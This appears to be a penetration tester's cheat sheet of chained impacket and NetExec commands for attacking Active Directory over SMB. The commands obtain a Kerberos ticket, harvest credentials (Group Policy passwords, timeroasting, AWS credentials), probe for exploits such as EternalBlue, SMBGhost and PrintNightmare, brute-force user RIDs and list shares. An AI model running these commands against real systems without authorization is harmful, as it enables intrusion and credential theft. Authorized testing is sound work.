# SMB
#target/remote #os/linux #cat/ad #proto/smb #port/445

## SMB all in one (excluding noPac)
```
getTGT.py <domain>/'<user>'<impacket_auth>;export KRB5CCNAME=$(pwd)/'<user>'.ccache; nxc smb <ip> -u '<user>' --use-kcache --pass-pol --shares; nxc smb <ip> -u '<user>' --use-kcache -M timeroast; nxc smb <ip> -u '<user>' --use-kcache -M webdav -M spooler -M ioxidresolver; nxc smb <ip> -u '<user>' --use-kcache -M gpp_autologin; nxc smb <ip> -u '<user>' --use-kcache -M gpp_password; nxc smb <ip> -u '<user>' --use-kcache -M ms17-010 -M remove-mic -M smbghost -M enum_ca -M aws-credentials -M coerce_plus; nxc smb <ip> -u '<user>' --use-kcache -M printnightmare; nxc smb <ip> -u '<user>' --use-kcache --users --rid-brute 10000; smbclientng --host <fqdn> -d <domain> -u '<user>' -k --no-pass -S <(echo 'shares')
```

## smbclientng
```
smbclientng --host <fqdn> -d <domain> -u '<user>' <auth> -S <(echo 'shares')
```

## nxc smb modules
```
nxc smb <ip> -u '<user>' <auth> <smb_modules>
```
